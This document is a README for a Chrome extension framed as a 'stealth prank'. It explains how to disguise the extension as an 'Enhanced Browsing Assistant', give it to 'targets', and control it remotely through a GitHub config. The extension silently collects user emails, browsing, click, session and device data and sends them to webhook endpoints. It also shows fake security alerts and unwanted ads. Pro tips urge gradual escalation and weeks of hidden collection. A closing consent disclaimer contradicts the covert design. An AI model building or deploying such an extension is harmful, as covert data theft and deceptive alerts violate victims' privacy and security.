# 🎭 Stealth Prank Mode Setup

## Overview
This extension operates in **stealth mode** as a remote-controlled prank. All behavior is controlled via GitHub config without users knowing.

## 🎯 Key Features
- **No visible UI** - extension runs completely hidden
- **Remote control** - all settings controlled via GitHub config.json
- **Stealth data collection** - silently collects user data and sends to remote endpoints
- **Real-time updates** - change behavior instantly by editing GitHub config

## 🔧 Setup Instructions

### 1. Data Collection Endpoints
Set up your data collection endpoints in `config.json`:

```json
{
  "analytics": {
    "enabled": true,
    "endpoint": "https://webhook.site/your-unique-id",
    "backup_endpoint": "https://httpbin.org/post",
    "stealth_mode": true
  }
}
```

**Recommended Services:**
- **Webhook.site** - Free, instant setup, real-time data viewing
- **RequestBin** - Similar to webhook.site
- **Heroku/Railway** - For custom backend
- **Discord Webhook** - Send data to Discord channel
- **Google Forms** - Simple data collection

### 2. Remote Configuration
All extension behavior is controlled via GitHub config:

**To update behavior:**
1. Edit `config.json` in GitHub web interface
2. Changes apply within 5 minutes across all users
3. No extension file updates needed

**Example prank configurations:**

```json
{
  "preroll": {
    "enabled": true,
    "chance": 0.8,
    "videoId": "YV0NfxtK0n0"
  },
  "toast": {
    "enabled": true,
    "messages": [
      {
        "title": "Your Computer Has Been Scanned!",
        "subtitle": "Click here for security details",
        "weight": 10
      }
    ]
  }
}
```

### 3. Stealth Data Collection
Extension automatically collects:
- **User emails** (from Google/YouTube accounts)
- **Browsing behavior** 
- **Click tracking**
- **Session data**
- **Device information**
- **Subscription events**

All sent silently to your endpoints.

### 4. Installation (Target Users)
Give targets this "Enhanced Browsing Assistant" extension:
1. Load unpacked extension in Chrome
2. Extension appears as harmless "browser enhancement"
3. No visible indication it's running
4. All activity controlled remotely by you

## 🎮 Remote Controls

### Instant Behavior Changes
Edit GitHub config to:
- Turn features on/off instantly
- Change ad frequency
- Update video content
- Modify data collection
- Add new tracking

### Data Monitoring
Monitor collected data in real-time via your webhook endpoints.

### Emergency Controls
```json
{
  "enabled": false  // Instantly disable entire extension
}
```

## 📊 Data Collection Example

When users browse, you'll receive data like:
```json
{
  "userId": "user_1642123456789_abc123",
  "userEmail": "target@gmail.com",
  "eventType": "page_visit",
  "domain": "youtube.com",
  "timestamp": 1642123456789,
  "userAgent": "Chrome/96.0...",
  "sessionData": {
    "screenResolution": "1920x1080",
    "language": "en-US",
    "timezone": "America/New_York"
  }
}
```

## 🎭 Prank Ideas
- Sudden video ads during important meetings
- Fake "security alerts" via toast notifications
- Subscription tracking to see if they actually subscribe
- Silent data collection for weeks before revealing

## 🔒 Security Notes
- Extension appears as "Enhanced Browsing Assistant"
- No traces in browser UI
- All logs hidden from users
- Data sent via encrypted HTTPS
- Can be remotely disabled instantly

## 🚀 Pro Tips
1. **Start subtle** - low frequency ads at first
2. **Collect data silently** for baseline behavior
3. **Escalate gradually** - increase frequency over time
4. **Use realistic messaging** in toast notifications
5. **Monitor in real-time** via webhook dashboards
6. **Have exit strategy** - can disable instantly via GitHub

---

**Remember**: This is for educational/entertainment purposes with consenting participants only. 